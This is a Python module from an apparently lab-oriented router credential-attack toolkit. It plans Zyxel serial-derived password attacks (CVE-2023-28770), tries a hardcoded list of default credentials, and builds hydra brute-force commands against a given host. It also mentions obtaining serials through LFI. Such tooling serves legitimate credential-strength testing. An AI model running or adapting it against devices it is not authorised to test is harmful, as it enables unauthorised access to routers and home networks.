"""Credential strategy — DERIVE before BRUTE.

Order of preference (least-noise / most-defensible first):
    1. Vendor-specific derivation (e.g. Zyxel serial-derived supervisor pw,
       CVE-2023-28770). Deterministic, no lockout risk, demonstrates a real
       systemic weakness rather than a guess.
    2. Default / known credentials (small curated list).
    3. Smart brute force via hydra (last resort, lockout-aware).

Brute force is a credential-strength check for your OWN lab devices only:
rate-limited (low parallelism, first-found) to detect default/weak-credential
weakness without locking the account.

NOTE: This module *orchestrates*. The Zyxel key-derivation itself
(`zcfgBeCommonGenKeyBySerialNumMethod2/3`) is reconstructed in `zyxel_keygen`
once we validate it against data/device_inventory.csv (S210Y known-good pairs).
Until validated it is a stub that refuses to emit a fake password.
"""
from __future__ import annotations

import os
import shutil
import subprocess
from dataclasses import dataclass, field

# Curated default creds for CPEs we actually meet (keep it SMALL — lockout aware).
DEFAULT_CREDS = [
    ("admin", "admin"),
    ("admin", "1234"),
    ("admin", "password"),
    ("supervisor", "supervisor"),
    ("root", "root"),
    ("user", "user"),
]

# Shared wordlist paths — the single source of truth for both the plan here and
# the brute executed in attack.py (so the planned command == the run command).
DATA = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "..", "data")
USERLIST = os.path.normpath(os.path.join(DATA, "users.txt"))
PASSLIST = os.path.normpath(os.path.join(DATA, "passwords.txt"))


@dataclass
class CredPlan:
    host: str
    port: int = 22
    service: str = "ssh"
    derived: list[str] = field(default_factory=list)   # derivation candidates
    defaults: list[tuple[str, str]] = field(default_factory=lambda: list(DEFAULT_CREDS))
    notes: list[str] = field(default_factory=list)


# ---------------------------------------------------------------------------
# 1. Vendor derivation
# ---------------------------------------------------------------------------
def zyxel_serial_derive(serial: str) -> list[str]:
    """CVE-2023-28770 serial->supervisor/root pw candidates (Method2/Method3).

    Uses our validated keygen (weaknd.zyxel_keygen, checked against published
    test vectors). CONFIRMED to reproduce VMG8825/NR-family (S20/S21) passwords.
    NOTE: verified NOT to match our EX3301-T0 units (S210Y/S240Y) — that model
    uses a device-specific derivation (S240Y even uses symbols). See
    research/FINDINGS.md. We still emit candidates; they are tried, not trusted.
    """
    try:
        from . import zyxel_keygen as zk
    except Exception:
        return []
    try:
        c = zk.candidates(serial)
        return [c["method3"], c["method2"]]
    except Exception:
        return []


def plan_derivation(vendor: str | None, serial: str | None, notes: list[str]) -> list[str]:
    cands: list[str] = []
    if vendor and vendor.lower() == "zyxel" and serial:
        cands = zyxel_serial_derive(serial)
        if cands:
            notes.append(f"zyxel serial-derivation produced {len(cands)} candidate(s)")
        else:
            notes.append("zyxel: serial unknown or out-of-range / keygen not yet validated")
    elif vendor and vendor.lower() == "zyxel":
        notes.append("zyxel detected but serial unknown — obtain serial (LFI/web/sticker) first")
    return cands


# ---------------------------------------------------------------------------
# 2/3. Hydra brute (last resort)
# ---------------------------------------------------------------------------
def hydra_available() -> bool:
    return shutil.which("hydra") is not None


def build_hydra_cmd(host: str, port: int, service: str = "ssh",
                    userlist: str = USERLIST, passlist: str = PASSLIST,
                    tasks: int = 4) -> list[str]:
    """Build (do not run) a lockout-aware hydra command.

    This is the single command builder: attack.py runs exactly this, so the
    plan shown here and the brute executed there can never diverge. Rate-limit
    safety: -t <=4 (low parallelism) and -f (stop at first valid credential).
    Lab use only — a credential-strength check against your own devices.
    """
    return [
        "hydra", "-L", userlist, "-P", passlist,
        "-t", str(tasks), "-f", "-I",
        "-s", str(port), "-o", "/dev/stdout", f"{service}://{host}",
    ]


def plan(host: str, port: int = 22, service: str = "ssh",
         vendor: str | None = None, serial: str | None = None) -> CredPlan:
    cp = CredPlan(host=host, port=port, service=service)
    cp.derived = plan_derivation(vendor, serial, cp.notes)
    if hydra_available():
        cmd = build_hydra_cmd(host, port, service, USERLIST, PASSLIST)
        cp.notes.append("brute (primary=hydra), would run: " + " ".join(cmd))
    else:
        cp.notes.append("hydra not installed — brute would use sshpass fallback "
                        "(`sudo apt install hydra` to enable the primary engine)")
    cp.notes.append("order: derive -> defaults -> brute (lockout-aware); "
                    "brute executes in attack.py, not here")
    return cp
